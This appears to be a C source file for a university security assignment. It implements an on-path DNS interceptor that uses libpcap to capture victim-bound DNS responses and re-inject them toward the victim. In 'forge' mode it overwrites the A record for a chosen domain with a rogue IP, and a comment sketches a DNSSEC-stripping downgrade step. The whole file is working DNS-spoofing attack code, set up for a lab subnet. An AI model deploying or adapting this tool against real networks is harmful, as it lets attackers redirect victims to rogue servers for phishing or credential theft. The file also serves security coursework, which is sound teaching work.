/*
 * dns_intercept.c : on-path DNS interceptor (libpcap capture + inject)
 *
 * CS6008 Assignment 2. Shared attack tool for phases 2, 4 and 6.
 *
 * The attacker sits on a subnet, and a route on the router (not this program)
 * sends the victim's inbound DNS responses to us at layer 2. The kernel drops
 * those frames, since the dst IP isn't ours and we don't ip_forward, so we grab
 * them with libpcap and send them on toward the victim with pcap_inject. We
 * relay everything untouched, except we rewrite the answer for one name.
 *
 *   relay  : forward every diverted packet unchanged (transparency check)
 *   forge  : for <target> A responses, set the A rdata to <rogue-ip>; everything
 *            else, including www.<target>, is relayed untouched
 *
 * Phase 4 (strip) and phase 6 (last-mile) extend forge_or_relay(); see the
 * PHASE4 / PHASE6 notes below.
 *
 * Build:  make           (needs libpcap-dev)
 * Run  :  ./dns_intercept -i eth0 -v 172.16.2.10 -t example.com -r 172.16.1.30 -m forge
 *
 * Uses only POSIX + libpcap (no Scapy or dnspython, per the brief).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>

/* config (from argv) */
static char      g_iface[64]   = "eth0";
static char      g_target[256] = "example.com";   /* name to hijack           */
static uint32_t  g_rogue_ip    = 0;                /* rogue A rdata (net order)*/
static uint32_t  g_victim_ip   = 0;                /* who the replies go to    */
static int       g_forge       = 0;                /* 0=relay, 1=forge         */
static uint8_t   g_my_mac[6];                      /* attacker NIC MAC         */
static uint8_t   g_victim_mac[6];                  /* next hop toward victim   */
static pcap_t   *g_pcap        = NULL;
static long      g_seen = 0, g_forged = 0, g_relayed = 0;

/* checksums */
static uint16_t cksum16(const uint16_t *p, int len, uint32_t sum)
{
    while (len > 1) { sum += *p++; len -= 2; }
    if (len == 1) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

static void fix_checksums(struct ip *ip4, struct udphdr *udp, int udp_len)
{
    ip4->ip_sum = 0;
    ip4->ip_sum = cksum16((uint16_t *)ip4, ip4->ip_hl * 4, 0);

    /* UDP checksum with IPv4 pseudo-header */
    uint32_t sum = 0;
    sum += (ip4->ip_src.s_addr >> 16) & 0xffff;
    sum += (ip4->ip_src.s_addr) & 0xffff;
    sum += (ip4->ip_dst.s_addr >> 16) & 0xffff;
    sum += (ip4->ip_dst.s_addr) & 0xffff;
    sum += htons(IPPROTO_UDP);
    sum += htons((uint16_t)udp_len);
    udp->uh_sum = 0;
    udp->uh_sum = cksum16((uint16_t *)udp, udp_len, sum);
    if (udp->uh_sum == 0) udp->uh_sum = 0xffff; /* 0 means "no checksum" in v4 */
}

/* DNS helpers */
/* Read a DNS name starting at *p (within [base,end)); advance *p past it in the
 * wire sense (stops at the first label; compression pointers end the name).
 * Writes a dotted, lowercased name into out. Returns 0 on success. */
static int dns_read_name(const uint8_t *base, const uint8_t *end,
                         const uint8_t **p, char *out, size_t outsz)
{
    size_t o = 0; int jumped = 0; const uint8_t *q = *p;
    const uint8_t *after = NULL;
    while (q < end) {
        uint8_t len = *q;
        if ((len & 0xc0) == 0xc0) {                 /* compressed name pointer */
            if (q + 1 >= end) return -1;
            if (!jumped) after = q + 2;
            uint16_t off = ((len & 0x3f) << 8) | q[1];
            q = base + off; jumped = 1;
            if (q >= end) return -1;
            continue;
        }
        if (len == 0) { q++; break; }               /* zero length label = end of name */
        if (len > 63 || q + 1 + len > end) return -1;
        for (int i = 0; i < len; i++) {
            char c = (char)q[1 + i];
            if (c >= 'A' && c <= 'Z') c += 32;       /* lowercase */
            if (o + 1 < outsz) out[o++] = c;
        }
        if (o + 1 < outsz) out[o++] = '.';
        q += 1 + len;
    }
    if (o > 0 && out[o - 1] == '.') o--;             /* drop trailing dot */
    out[o] = '\0';
    *p = jumped ? after : q;
    return 0;
}

/* skip one name on the wire (handles compression) */
static const uint8_t *dns_skip_name(const uint8_t *end, const uint8_t *p)
{
    while (p < end) {
        uint8_t len = *p;
        if ((len & 0xc0) == 0xc0) return p + 2;
        if (len == 0) return p + 1;
        p += 1 + len;
    }
    return end;
}

/* DNS header (RFC 1035) */
struct dnshdr { uint16_t id, flags, qd, an, ns, ar; };

/*
 * forge_or_relay(): inspect/modify the DNS payload in place.
 * Returns 1 if the packet should still be forwarded, 0 to drop it.
 * For Phase 2 'forge': rewrite A rdata of the exact target name to the rogue IP.
 */
static int forge_or_relay(uint8_t *dns, int dlen)
{
    if (dlen < (int)sizeof(struct dnshdr)) return 1;
    struct dnshdr *h = (struct dnshdr *)dns;
    if (!(ntohs(h->flags) & 0x8000)) return 1;       /* only responses */
    int qd = ntohs(h->qd), an = ntohs(h->an);
    if (qd < 1) return 1;

    const uint8_t *base = dns, *end = dns + dlen;
    const uint8_t *p = dns + sizeof(struct dnshdr);

    /* question: read QNAME, QTYPE */
    char qname[256];
    if (dns_read_name(base, end, &p, qname, sizeof qname) < 0) return 1;
    if (p + 4 > end) return 1;
    uint16_t qtype = ntohs(*(uint16_t *)p);
    p += 4;                                          /* qtype + qclass */

    /* Only hijack the EXACT target name, type A. www.<target> is left alone. */
    if (qtype != 1 || strcasecmp(qname, g_target) != 0)
        return 1;

    if (!g_forge) return 1;                          /* relay mode: untouched */

    /* skip remaining questions (we built for qd==1 but be safe) */
    for (int i = 1; i < qd; i++) {
        p = dns_skip_name(end, p);
        if (p + 4 > end) return 1;
        p += 4;
    }

    /* answers: overwrite A rdata */
    int changed = 0;
    for (int i = 0; i < an; i++) {
        p = dns_skip_name(end, p);
        if (p + 10 > end) break;
        uint16_t type = ntohs(*(uint16_t *)p);
        uint16_t rdlen = ntohs(*(uint16_t *)(p + 8));
        uint8_t *rdata = (uint8_t *)p + 10;
        if (rdata + rdlen > end) break;
        if (type == 1 && rdlen == 4) {               /* A record */
            memcpy(rdata, &g_rogue_ip, 4);           /* -> rogue-web */
            changed = 1;
        }
        /* PHASE4 hook: here is where strip mode would drop RRSIG(46)/DNSKEY(48)
         * records and rewrite the header counts for a downgrade. */
        p = rdata + rdlen;
    }
    if (changed) g_forged++;
    return 1;
}

static void on_packet(u_char *user, const struct pcap_pkthdr *hdr,
                      const u_char *bytes)
{
    (void)user;
    static uint8_t buf[65536];
    if (hdr->caplen < sizeof(struct ether_header) + sizeof(struct ip)) return;
    if (hdr->caplen > sizeof buf) return;
    memcpy(buf, bytes, hdr->caplen);

    struct ether_header *eth = (struct ether_header *)buf;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    struct ip *ip4 = (struct ip *)(buf + sizeof(struct ether_header));
    int ihl = ip4->ip_hl * 4;
    if (ip4->ip_p != IPPROTO_UDP) return;
    if (ip4->ip_dst.s_addr != g_victim_ip) return;   /* only victim-bound */

    struct udphdr *udp = (struct udphdr *)((uint8_t *)ip4 + ihl);
    int udp_len = ntohs(udp->uh_ulen);
    uint8_t *dns = (uint8_t *)udp + sizeof(struct udphdr);
    int dlen = udp_len - sizeof(struct udphdr);
    if (dlen <= 0) return;

    g_seen++;
    int forward = forge_or_relay(dns, dlen);
    if (!forward) return;

    /* relay toward the victim: our MAC -> victim MAC, recompute checksums */
    memcpy(eth->ether_shost, g_my_mac, 6);
    memcpy(eth->ether_dhost, g_victim_mac, 6);
    fix_checksums(ip4, udp, udp_len);

    if (pcap_inject(g_pcap, buf, hdr->caplen) < 0)
        fprintf(stderr, "inject failed: %s\n", pcap_geterr(g_pcap));
    else
        g_relayed++;
}

/* read a MAC for an IP from /proc/net/arp (populated by a startup ping) */
static int mac_from_arp(const char *ip, uint8_t mac[6])
{
    FILE *f = fopen("/proc/net/arp", "r");
    if (!f) return -1;
    char line[256]; fgets(line, sizeof line, f);     /* header */
    int found = -1;
    while (fgets(line, sizeof line, f)) {
        char a[64], hw[64]; unsigned m[6];
        if (sscanf(line, "%63s %*s %*s %63s", a, hw) == 2 && strcmp(a, ip) == 0) {
            if (sscanf(hw, "%x:%x:%x:%x:%x:%x", &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6) {
                for (int i=0;i<6;i++) mac[i]=(uint8_t)m[i];
                found = 0;
            }
            break;
        }
    }
    fclose(f);
    return found;
}

static int my_mac(const char *iface, uint8_t mac[6])
{
    char path[128], buf[32];
    snprintf(path, sizeof path, "/sys/class/net/%s/address", iface);
    FILE *f = fopen(path, "r"); if (!f) return -1;
    if (!fgets(buf, sizeof buf, f)) { fclose(f); return -1; }
    fclose(f);
    unsigned m[6];
    if (sscanf(buf, "%x:%x:%x:%x:%x:%x", &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) != 6) return -1;
    for (int i=0;i<6;i++) mac[i]=(uint8_t)m[i];
    return 0;
}

static void stop(int sig){ (void)sig; if (g_pcap) pcap_breakloop(g_pcap); }

int main(int argc, char **argv)
{
    const char *victim = "172.16.2.10", *rogue = "172.16.1.30", *mode = "relay";
    int opt;
    while ((opt = getopt(argc, argv, "i:v:t:r:m:")) != -1) {
        switch (opt) {
        case 'i': snprintf(g_iface, sizeof g_iface, "%s", optarg); break;
        case 'v': victim = optarg; break;
        case 't': snprintf(g_target, sizeof g_target, "%s", optarg); break;
        case 'r': rogue = optarg; break;
        case 'm': mode = optarg; break;
        default:
            fprintf(stderr, "usage: %s -i IFACE -v VICTIM_IP -t NAME -r ROGUE_IP -m relay|forge\n", argv[0]);
            return 2;
        }
    }
    g_forge = (strcmp(mode, "forge") == 0);
    g_victim_ip = inet_addr(victim);
    g_rogue_ip  = inet_addr(rogue);

    if (my_mac(g_iface, g_my_mac) < 0) { fprintf(stderr, "cannot read own MAC on %s\n", g_iface); return 1; }
    /* victim MAC: populated by the launcher pinging the victim first */
    for (int tries = 0; tries < 20 && mac_from_arp(victim, g_victim_mac) < 0; tries++) usleep(200000);
    if (mac_from_arp(victim, g_victim_mac) < 0) {
        fprintf(stderr, "no ARP entry for victim %s (ping it first)\n", victim);
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    g_pcap = pcap_open_live(g_iface, 65535, 1, 10, errbuf);
    if (!g_pcap) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }

    /* capture only diverted victim-bound DNS responses addressed to our NIC */
    char filter[256];
    char macs[18];
    snprintf(macs, sizeof macs, "%02x:%02x:%02x:%02x:%02x:%02x",
             g_my_mac[0],g_my_mac[1],g_my_mac[2],g_my_mac[3],g_my_mac[4],g_my_mac[5]);
    snprintf(filter, sizeof filter,
             "ether dst %s and udp and src port 53 and dst host %s", macs, victim);
    struct bpf_program bp;
    if (pcap_compile(g_pcap, &bp, filter, 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(g_pcap, &bp) < 0) {
        fprintf(stderr, "bpf: %s\n", pcap_geterr(g_pcap)); return 1;
    }

    signal(SIGINT, stop); signal(SIGTERM, stop);
    fprintf(stderr, "[intercept] iface=%s mode=%s target=%s rogue=%s victim=%s\n",
            g_iface, g_forge ? "FORGE" : "relay", g_target, rogue, victim);
    fprintf(stderr, "[intercept] filter: %s\n", filter);

    pcap_loop(g_pcap, -1, on_packet, NULL);

    fprintf(stderr, "\n[intercept] seen=%ld relayed=%ld forged=%ld\n",
            g_seen, g_relayed, g_forged);
    pcap_close(g_pcap);
    return 0;
}
